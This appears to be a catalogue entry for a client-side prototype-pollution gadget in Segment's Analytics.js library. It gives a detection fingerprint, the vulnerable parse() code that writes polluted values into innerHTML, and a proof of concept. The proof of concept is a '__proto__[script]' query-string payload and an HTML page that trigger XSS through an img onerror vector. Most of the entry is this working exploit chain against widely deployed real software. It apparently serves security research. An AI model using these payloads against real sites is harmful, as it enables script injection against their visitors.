## Segment Analytics.js

URL: https://segment.com/docs/connections/sources/catalog/libraries/website/javascript/quickstart/

### JS Fingerprint
```
return (typeof analytics !== 'undefined' && typeof analytics.SNIPPET_VERSION !== 'undefined')
```

### Vulnerable code fragment
https://cdn.segment.com/analytics.js/v1/platform/analytics.js
```js
var AdWords = module.exports = integration('AdWords')
  .option('conversionId', '')
  .option('pageRemarketing', false)
  .option('eventMappings', [])
  .tag('<script src="//www.googleadservices.com/pagead/conversion_async.js">');

...

function parse(html, doc) {
  ...
  var wrap = map[tag] || map._default;
  var depth = wrap[0];
  var prefix = wrap[1];
  var suffix = wrap[2];
  var el = doc.createElement('div');
  el.innerHTML = prefix + html + suffix;
```

### PoC

```
?__proto__[script][0]=1&__proto__[script][1]=<img/src/onerror%3dalert(1)>&__proto__[script][2]=1
```

```html
<script>
	Object.prototype.script = [1,'<img/src/onerror=alert(1)>','<img/src/onerror=alert(2)>']
</script>

<script type="text/javascript">
  !function(){var analytics=window.analytics=window.analytics||[];if(!analytics.initialize)if(analytics.invoked)window.console&&console.error&&console.error("Segment snippet included twice.");else{analytics.invoked=!0;analytics.methods=["trackSubmit","trackClick","trackLink","trackForm","pageview","identify","reset","group","track","ready","alias","debug","page","once","off","on","addSourceMiddleware","addIntegrationMiddleware","setAnonymousId","addDestinationMiddleware"];analytics.factory=function(t){return function(){var e=Array.prototype.slice.call(arguments);e.unshift(t);analytics.push(e);return analytics}};for(var t=0;t<analytics.methods.length;t++){var e=analytics.methods[t];analytics[e]=analytics.factory(e)}analytics.load=function(t,e){var n=document.createElement("script");n.type="text/javascript";n.async=!0;n.src="https://cdn.segment.com/analytics.js/v1/"+t+"/analytics.min.js";var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(n,a);analytics._loadOptions=e};analytics.SNIPPET_VERSION="4.1.0";
  analytics.load("platform");
  analytics.page();
  }}();
</script>
```
